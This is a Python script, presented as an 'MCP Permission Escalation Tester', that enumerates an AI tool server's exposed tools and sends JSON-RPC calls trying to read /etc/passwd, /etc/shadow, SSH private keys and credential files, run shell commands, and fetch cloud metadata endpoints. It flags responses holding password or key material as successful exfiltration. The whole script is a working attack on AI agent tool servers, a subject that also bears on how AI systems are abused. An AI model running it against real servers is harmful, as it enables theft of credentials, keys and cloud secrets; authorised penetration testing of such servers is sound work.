#!/usr/bin/env python3
"""
MCP Permission Escalation Tester
Tests whether a low-privilege tool can be used to access what other tools expose
"""
import requests
import json
import sys
import os

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

TOOLS_TO_TEST = {
    # Tool name: high-value path that tool might reach
    "file_read": ["/etc/passwd", "/root/.ssh/id_rsa", "/app/config/creds.json"],
    "exec": ["/bin/sh", "id", "cat /etc/shadow"],
    "network_fetch": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/"],
    "list_dir": ["/", "/root", "/app"],
    "git_clone": ["/etc/shadow", "root@localhost:/root"],
}

def test_tool_escalation(target, tool_name, paths):
    """Try to access high-value paths through a tool"""
    results = []
    for path in paths:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": tool_name,
                "arguments": {"path": path}
            }
        }
        try:
            r = requests.post(f"{target}/mcp/call", json=payload, timeout=10)
            result = r.json()
            resp_str = json.dumps(result)
            # Check for successful data exfiltration
            if "root:" in resp_str or "ssh-rsa" in resp_str or "shadow" in resp_str.lower():
                results.append(f"[!] ESCALATED: {tool_name} -> {path}")
                results.append(f"    Response: {resp_str[:500]}")
            elif "error" not in resp_str and resp_str != '{"result":{}}':
                results.append(f"[~] Sensitive-ish: {tool_name} -> {path}: {resp_str[:200]}")
        except Exception as e:
            pass
    return results

def main():
    print(f"[*] MCP Permission Escalation Tester")
    print(f"[*] Target: {TARGET}\n")
    
    # First enumerate tools
    try:
        r = requests.get(f"{TARGET}/.well-known/mcp.json", timeout=5)
        tools = r.json().get('tools', [])
    except:
        print("[-] Could not enumerate tools. Check target.")
        return
    
    print(f"[*] Found {len(tools)} tools. Testing escalation paths...\n")
    
    all_results = {}
    for tool in tools:
        tname = tool.get('name', 'unknown')
        if tname in TOOLS_TO_TEST:
            print(f"[*] Testing escalation via: {tname}")
            results = test_tool_escalation(TARGET, tname, TOOLS_TO_TEST[tname])
            if results:
                all_results[tname] = results
    
    if all_results:
        print("\n[!] ESCALATION PATHS FOUND:")
        for tool, findings in all_results.items():
            print(f"\n{tool}:")
            for f in findings:
                print(f"  {f}")
    else:
        print("\n[-] No obvious escalation paths found.")

if __name__ == "__main__":
    main()